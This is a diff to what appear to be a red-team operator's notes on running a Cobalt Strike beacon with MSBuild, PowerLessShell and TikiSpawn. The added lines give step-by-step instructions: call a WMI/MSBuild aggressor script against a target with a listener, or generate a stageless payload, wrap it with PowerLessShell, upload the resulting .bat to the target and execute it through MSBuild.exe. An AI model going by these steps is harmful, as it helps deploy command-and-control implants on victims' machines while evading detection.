@@ -1,4 +1,15 @@
-# These instructions explain how to execute a CS Beacon using MSBuild and TikiSpawn
+ # PowerLessShell: https://github.com/Mr-Un1k0d3r/PowerLessShell
+    - ** MUST have PowerLessShell folder in cobalt directory.
+    - Agressor Script: wmi_msbuild -target <target> -listener "<listener>"
+      - Must use https listener if using Coblat script
+    - Manual execution (works with SMB beacon but will have to link to it)
+      - Generate cobalt stageless paylaod and save to PowerLessShell directory as payload.ps1
+      - run python PowerLessShell.py and use Powershell -> payload.ps1 -> output_filename
+        - Upload output_filename.bat to target and execute it
+        - Excute with cobalt: shell C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe output_filename
+
+
+# Executing a CS Beacon using MSBuild and TikiSpawn
 # Link: https://rastamouse.me/2019/06/tikispawn-msbuild/
 
 #GENERATE PAYLOAD
